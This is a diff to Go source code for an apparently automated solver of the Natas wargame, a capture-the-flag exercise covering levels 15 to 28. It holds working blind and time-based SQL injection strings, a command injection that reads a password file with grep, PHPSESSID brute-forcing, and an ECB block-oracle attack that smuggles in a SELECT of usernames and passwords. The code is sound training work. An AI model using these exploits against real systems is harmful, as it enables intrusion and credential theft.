@@ -107,7 +107,7 @@ func (h Host) Grab(r http.Request) string {
 
 type Headers struct {
 	Grabber
-	Headers SetData
+	SetData
 }
 
 func (h Headers) Grab(r http.Request) string {
@@ -115,14 +115,15 @@ func (h Headers) Grab(r http.Request) string {
 	for key, value := range r.Header {
 		newHeaders[key] = value
 	}
-	h.Headers.Set(r, newHeaders)
+	h.Set(r, newHeaders)
 	r.Header = newHeaders
-	return h.Grabber.Grab(r)
+	p := h.Grabber.Grab(r)
+	return p
 }
 
 type Post struct {
 	Grabber
-	Data SetData
+	SetData
 	File *File
 }
 
@@ -142,7 +143,7 @@ func (m MPSetter) Set(key, value string) {
 func (p Post) Grab(r http.Request) string {
 	var b memio.Buffer
 	m := multipart.NewWriter(&b)
-	p.Data.Set(r, MPSetter{m})
+	p.Set(r, MPSetter{m})
 	if p.File != nil {
 		rw, err := m.CreateFormFile(p.File.Field.Grab(r), p.File.Name.Grab(r))
 		e(err)
@@ -157,12 +158,12 @@ func (p Post) Grab(r http.Request) string {
 
 type Get struct {
 	Grabber
-	Data SetData
+	SetData
 }
 
 func (g Get) Grab(r http.Request) string {
-	values := make(url.Values, len(g.Data))
-	g.Data.Set(r, values)
+	values := make(url.Values, len(g.SetData))
+	g.Set(r, values)
 	oldQuery := r.URL.RawQuery
 	r.URL.RawQuery = values.Encode()
 	s := g.Grabber.Grab(r)
@@ -217,6 +218,11 @@ func (b Base64Encode) Grab(r http.Request) string {
 
 type SetData map[string]Grabber
 
+type SetDataGrabber interface {
+	Grabber
+	SetKey(string, Grabber)
+}
+
 type Setter interface {
 	Set(string, string)
 }
@@ -225,6 +231,10 @@ func (sd SetData) Set(r http.Request, s Setter) {
 	for key, g := range sd {
 		s.Set(key, g.Grab(r))
 	}
+}
+
+func (sd SetData) SetKey(Key string, Value Grabber) {
+	sd[Key] = Value
 }
 
 type Cookie struct {
@@ -290,33 +300,26 @@ func (c Combine) Grab(r http.Request) string {
 	return prefix + suffix
 }
 
-type BruteForcePassword struct {
+type BruteForceString struct {
+	SetDataGrabber
 	Field, Prefix, Suffix, First, Wildcard string
-	Grabber
 }
 
-func (s BruteForcePassword) Grab(r http.Request) string {
+func (s BruteForceString) Grab(r http.Request) string {
 	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
-	var (
-		p = Post{
-			s.Grabber,
-			SetData{s.Field: nil},
-			nil,
-		}
-		result, knownChars string
-	)
+	var result, knownChars string
 
 	for _, c := range chars {
-		p.Data[s.Field] = Text{s.Prefix + s.Wildcard + string(c) + s.Wildcard + s.Suffix}
-		if p.Grab(r) == "1" {
+		s.SetDataGrabber.SetKey(s.Field, Text{s.Prefix + s.Wildcard + string(c) + s.Wildcard + s.Suffix})
+		if s.SetDataGrabber.Grab(r) == "1" {
 			knownChars += string(c)
 		}
 	}
 Loop:
 	for {
 		for _, c := range knownChars {
-			p.Data[s.Field] = Text{s.Prefix + s.First + result + string(c) + s.Wildcard + s.Suffix}
-			if p.Grab(r) == "1" {
+			s.SetDataGrabber.SetKey(s.Field, Text{s.Prefix + s.First + result + string(c) + s.Wildcard + s.Suffix})
+			if s.SetDataGrabber.Grab(r) == "1" {
 				result += string(c)
 				continue Loop
 			}
@@ -363,18 +366,17 @@ func (t TakesTime) Grab(r http.Request) string {
 	return "0"
 }
 
-type BruteForceCookie struct {
-	Grabber
+type BruteForceRange struct {
+	SetDataGrabber
 	Range
-	CookieName string
+	Field, Prefix, Suffix string
 }
 
-func (b BruteForceCookie) Grab(r http.Request) string {
-	headers := Headers{b.Grabber, SetData{"Cookie": nil}}
+func (b BruteForceRange) Grab(r http.Request) string {
 	for b.Range.Next() {
 		idStr := b.Range.ID()
-		headers.Headers["Cookie"] = Text{b.CookieName + "=" + idStr}
-		if headers.Grab(r) == "1" {
+		b.SetDataGrabber.SetKey(b.Field, Text{b.Prefix + idStr + b.Suffix})
+		if b.SetDataGrabber.Grab(r) == "1" {
 			return idStr
 		}
 	}
@@ -462,6 +464,98 @@ func (p PHPSerialize) Grab(r http.Request) string {
 	}
 	fmt.Fprintf(&m, "}")
 	return string(m)
+}
+
+type GetHeader struct {
+	Header string
+}
+
+func (g GetHeader) Grab(r http.Request) string {
+	resp, err := http.DefaultClient.Do(&r)
+	e(err)
+	e(resp.Body.Close())
+	return resp.Header.Get(g.Header)
+}
+
+type Cut struct {
+	Grabber
+	Seperator string
+	Slice     int
+}
+
+func (c Cut) Grab(r http.Request) string {
+	parts := strings.Split(c.Grabber.Grab(r), c.Seperator)
+	if c.Slice >= len(parts) {
+		panic("invalid slice number")
+	}
+	return parts[c.Slice]
+}
+
+type URLDecode struct {
+	Grabber
+}
+
+func (u URLDecode) Grab(r http.Request) string {
+	str, err := url.QueryUnescape(u.Grabber.Grab(r))
+	e(err)
+	return str
+}
+
+type EBCBreaker struct {
+	Encrypter interface {
+		Grabber
+		SetKey(string, Grabber)
+	}
+	EncrypterField string
+	PlainText      string
+}
+
+func (e EBCBreaker) Grab(r http.Request) string {
+	e.Encrypter.SetKey(e.EncrypterField, Text{""})
+	initialLength := len(e.Encrypter.Grab(r))
+	i := 1
+	firstChange := -1
+	secondChange := -1
+	for {
+		e.Encrypter.SetKey(e.EncrypterField, Text{strings.Repeat("A", i)})
+		l := len(e.Encrypter.Grab(r))
+		if l != initialLength {
+			if firstChange == -1 {
+				initialLength = l
+				firstChange = l
+			} else {
+				secondChange = l
+				break
+			}
+		}
+		i++
+	}
+
+	blockSize := secondChange - firstChange
+
+	var offset, blockStart int
+	str := strings.Repeat("B", blockSize-1) + strings.Repeat("A", blockSize*2)
+
+Loop:
+	for i := 0; i < 16; i++ {
+		e.Encrypter.SetKey(e.EncrypterField, Text{str[15-i:]})
+		str := e.Encrypter.Grab(r)
+		last := ""
+		for j := 0; j < len(str); j += blockSize {
+			this := str[j : j+blockSize]
+			if this == last {
+				blockStart = (j / 16) - 1
+				offset = i
+				break Loop
+			}
+			last = this
+		}
+	}
+
+	e.Encrypter.SetKey(e.EncrypterField, Text{strings.Repeat("B", offset) + e.PlainText})
+	enc := e.Encrypter.Grab(r)
+
+	return enc[blockStart*blockSize:]
 }
 
 var levels = [...]Grabber{
@@ -580,31 +674,43 @@ var levels = [...]Grabber{
 		nil,
 	},
 	//level 15
-	BruteForcePassword{
+	BruteForceString{
+		Post{
+			NotContain{grab, "This user doesn't exist."},
+			SetData{},
+			nil,
+		},
 		"username",
 		"natas16\" AND password LIKE BINARY \"",
 		"",
 		"",
 		"%",
-		NotContain{grab, "This user doesn't exist."},
 	},
 	//level 16
-	BruteForcePassword{
+	BruteForceString{
+		Post{
+			NotContain{grab, "African"},
+			SetData{},
+			nil,
+		},
 		"needle",
 		"^$(grep -E ",
 		" /etc/natas_webpass/natas17)African",
 		"^",
 		".*",
-		NotContain{grab, "African"},
 	},
 	//level 17
-	BruteForcePassword{
+	BruteForceString{
+		Post{
+			TakesTime{grab, time.Second},
+			SetData{},
+			nil,
+		},
 		"username",
 		"natas18\" AND IF (password LIKE BINARY \"",
 		"\", SLEEP(1), null) AND password != \"",
 		"",
 		"%",
-		TakesTime{grab, time.Second},
 	},
 	//level 18
 	Headers{
@@ -616,13 +722,18 @@ var levels = [...]Grabber{
 		SetData{
 			"Cookie": Combine{
 				Text{"PHPSESSID="},
-				BruteForceCookie{
-					Contains{
-						grab,
-						"You are an admin.",
+				BruteForceRange{
+					Headers{
+						Contains{
+							grab,
+							"You are an admin.",
+						},
+						SetData{},
 					},
 					&NumRange{0, 640},
-					"PHPSESSID",
+					"Cookie",
+					"PHPSESSID=",
+					"",
 				},
 			},
 		},
@@ -637,10 +748,13 @@ var levels = [...]Grabber{
 		SetData{
 			"Cookie": Combine{
 				Text{"PHPSESSID="},
-				BruteForceCookie{
-					Contains{
-						grab,
-						"You are an admin.",
+				BruteForceRange{
+					Headers{
+						Contains{
+							grab,
+							"You are an admin.",
+						},
+						SetData{},
 					},
 					RangeHex{
 						RangeSuffix{
@@ -653,7 +767,9 @@ var levels = [...]Grabber{
 							"-admin",
 						},
 					},
-					"PHPSESSID",
+					"Cookie",
+					"PHPSESSID=",
+					"",
 				},
 			},
 		},
@@ -799,13 +915,18 @@ var levels = [...]Grabber{
 	//level 27
 	Get{
 		LoadAll{
-			BruteForceCookie{
-				Contains{
-					grab,
-					"Welcome natas28!",
+			BruteForceRange{ // Not actually brute-forcing a cookie, just submitting the post data over and over again in a timing attack.
+				Headers{
+					Contains{
+						grab,
+						"Welcome natas28!",
+					},
+					SetData{},
 				},
 				&NumRange{0, 1000000},
-				"a",
+				"Cookie",
+				"a=",
+				"",
 			},
 			Prefixed{
 				grab,
@@ -817,6 +938,39 @@ var levels = [...]Grabber{
 			"username": Text{"natas28"},
 			"password": Text{"a"},
 		},
+	},
+	//level 28
+	Prefixed{
+
+		Get{
+			Path{
+				grab,
+				Text{"/search.php"},
+			},
+			SetData{
+				"query": Base64Encode{
+					EBCBreaker{
+						&Post{
+							Base64Decode{
+								URLDecode{
+									Cut{
+										GetHeader{"Location"},
+										"=",
+										1,
+									},
+								},
+							},
+							SetData{},
+							nil,
+						},
+						"query",
+						"SELECT CONCAT(username, 0x3A, password) AS joke FROM users #",
+					},
+				},
+			},
+		},
+		"natas29:",
+		32,
 	},
 }
 
